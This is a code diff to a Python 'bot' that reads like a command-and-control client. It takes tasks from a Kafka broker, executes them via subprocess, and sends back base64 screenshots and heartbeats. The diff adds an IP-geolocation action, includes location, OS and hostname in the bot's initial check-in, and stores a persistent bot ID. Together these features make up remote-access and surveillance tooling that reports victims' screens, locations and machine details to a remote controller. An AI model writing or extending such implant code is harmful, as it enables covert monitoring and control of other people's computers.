@@ -9,7 +9,15 @@ import schedule
 from mss import mss
 from PIL import Image, ImageGrab
 import base64
+import geocoder
 
+""" Get current GPS coordinates using geocoder library. """
+def get_current_gps_coordinates():
+    g = geocoder.ip('me')
+    if g.latlng is not None:
+        return g.latlng
+    else:
+        return None
 
 """This script is a Kafka consumer that listens for tasks, executes them, and produces callback messages with the results.
 It also sends heartbeat messages to indicate that the bot is alive.
@@ -32,6 +40,9 @@ def handle_callback(task, group_id):
             # For creates an screenshot, use the system command and sends in base64 format
             result_str = shot_screenshot()
             print(f'Screenshot created successfully, size: {len(result_str)} bytes')
+        elif task['actionType'] == 'geolocation':
+            result_str = get_current_gps_coordinates()
+            print(f'Geolocation requested successfully, lat,lng: {result_str}')
     except subprocess.CalledProcessError as e:
         print(f'Script execution failed: {e.stderr}')
         result = e.stderr
@@ -81,22 +92,35 @@ def produce_heart_beat(bootstrap_servers, topic, bot_id):
     }
     produce_message(bootstrap_servers, "heartbeat", heart_beat_task)
 
-def main(bootstrap_servers, topic):
+def main(bootstrap_servers, topic, bot_id, storeNewBotId = False):
     # Create and start the consumer daemon
-    group_id = str(uuid.uuid4())
+    group_id = bot_id
+    # Store the bot ID in config.txt if not already present
+        
     consumer_daemon = KafkaConsumerDaemon(bootstrap_servers, topic, group_id, handle_callback)
     consumer_daemon.start()
 
     print(f"Kafka consumer opened successfully on topic {topic}")
 
-    # Produce initial message with a unique group ID
+    if storeNewBotId:
+        print(f"Storing bot ID for reuse: {bot_id}")
+        write_id_in_config('config.txt', bot_id)
+        
+    print("Generating initial message for new bot ID")
+    
+    # Produce initial message with a unique group ID and init geolocation
+    
+    result_geolocation__str = get_current_gps_coordinates()
+    print(f'Geolocation requested successfully, lat,lng: {result_geolocation__str}')
+    
     initial_task = {
         'id': '',
         'actionType': 'init',
         'parameters': {
             'groupId': group_id,
             'os': platform.platform(),
-            'name': platform.node()
+            'name': platform.node(),
+            'geolocation': result_geolocation__str
         },
         'result': "success"
     }
@@ -128,6 +152,10 @@ def read_config_file(file_path):
                 config[key.strip()] = value.strip()
     return config
 
+def write_id_in_config(file_path, bot_id):
+    with open(file_path, 'a') as file:
+        file.write(f"\nbot_id={bot_id}\n")
+
 if __name__ == '__main__':
     # Read configuration from config.txt
     config = read_config_file('config.txt')
@@ -138,5 +166,6 @@ if __name__ == '__main__':
 
     bootstrap_servers = config.get('bootstrap_servers')
     topic = config.get('topic')
+    bot_id = config.get('bot_id') if config.get('bot_id') is not None else str(uuid.uuid4())
 
-    main(bootstrap_servers, topic)
+    main(bootstrap_servers, topic, bot_id, config.get('bot_id') is None)
